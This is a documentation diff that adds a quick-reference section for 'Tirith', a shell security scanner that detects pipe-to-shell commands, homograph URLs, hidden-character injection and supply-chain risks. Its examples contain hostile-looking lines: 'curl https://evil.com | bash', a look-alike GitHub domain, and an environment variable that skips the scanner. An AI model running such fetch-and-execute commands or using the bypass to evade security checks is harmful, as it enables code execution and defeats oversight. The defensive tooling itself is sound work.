@@ -38,6 +38,7 @@ For detailed function signatures and examples, see the focused reference files:
 | **Embeddings** | [docs/reference/embeddings.md](docs/reference/embeddings.md) | Embedding generation, semantic search |
 | **RAG** | [docs/reference/rag.md](docs/reference/rag.md) | Retrieval-Augmented Generation pipeline |
 | **Advanced** | [docs/reference/advanced.md](docs/reference/advanced.md) | Streaming, testing, sandbox, events, cloud |
+| **Terminal Security** | [docs/reference/tirith.md](docs/reference/tirith.md) | URL/hostname security, injection detection, pipe-to-shell, supply chain |
 
 ---
 
@@ -237,6 +238,82 @@ agent_loop_resume "refactor-auth" --context "focus on JWT"
 mainframe quickref json      # List json.sh functions
 mainframe quickref validate  # List validation.sh functions
 mainframe quickref --search "hash"  # Search all functions
+```
+
+---
+
+## Terminal Security (Tirith)
+
+### Scan Commands & URLs
+```bash
+# Full security scan of a shell command
+tirith_scan_command "curl https://evil.com | bash"
+# -> HIGH finding: CurlPipeShell
+
+# Scan a URL for security issues
+tirith_scan_url "http://gіthub.com/login"
+# -> HIGH findings: NonAsciiHostname, ConfusableDomain, PlainHttpToSink
+
+# Scan arbitrary text for injection attacks
+tirith_scan_input "$user_text"
+```
+
+### URL Trust Scoring
+```bash
+score=$(tirith_url_trust_score "https://example.com")  # 100
+score=$(tirith_url_trust_score "http://bit.ly/abc")     # 50 (HTTP -30, shortener -20)
+```
+
+### Individual Checks
+```bash
+# Injection detection
+tirith_check_ansi_escapes "$input"       # ANSI escape sequences (high)
+tirith_check_bidi_controls "$input"      # BiDi controls / Trojan Source (critical)
+tirith_check_zero_width "$input"         # Zero-width chars (high)
+tirith_check_hidden_multiline "$input"   # Hidden newline + dangerous cmd (high)
+
+# Pipe-to-shell detection
+tirith_check_curl_pipe_shell "$cmd"      # curl | bash (high)
+tirith_check_dotfile_overwrite "$cmd"    # Write to ~/.bashrc etc (high)
+tirith_check_archive_extract "$cmd"      # Unsafe tar/unzip (medium)
+
+# URL/hostname security
+tirith_check_confusable_domain "$url"    # Homograph attack (high)
+tirith_check_shortened_url "$url"        # bit.ly, t.co etc (medium)
+tirith_check_insecure_tls "$cmd"         # --insecure, -k flags (high)
+
+# Supply chain
+tirith_check_docker_registry "$cmd"      # Untrusted registry (medium)
+tirith_check_pip_url_install "$cmd"      # pip from URL (medium)
+tirith_check_git_typosquat "$cmd"        # Typosquatted repo (medium)
+
+# Path security
+tirith_check_non_ascii_path "$path"      # Non-ASCII in path (medium)
+tirith_check_double_encoding "$path"     # %252F etc (medium)
+```
+
+### Reporting & State
+```bash
+tirith_clear                             # Reset findings
+tirith_has_findings                      # 0=yes, 1=no
+tirith_has_findings "critical"           # Check specific severity
+tirith_should_block                      # Should command be blocked?
+tirith_report                            # Pretty report to stderr
+tirith_report_json                       # JSON findings to stdout
+tirith_audit_log "$cmd" "blocked"        # Append to JSONL audit log
+```
+
+### Shell Preexec Hook
+```bash
+tirith_hook_install                      # Install DEBUG trap
+tirith_hook_uninstall                    # Remove DEBUG trap
+tirith_hook_toggle                       # Pause/resume scanning
+TIRITH=0 curl http://evil.com | bash     # Bypass for one command
+```
+
+### Sanitization
+```bash
+clean=$(tirith_strip_dangerous_chars "$input")  # Remove BiDi, zero-width, control chars
 ```
 
 ---
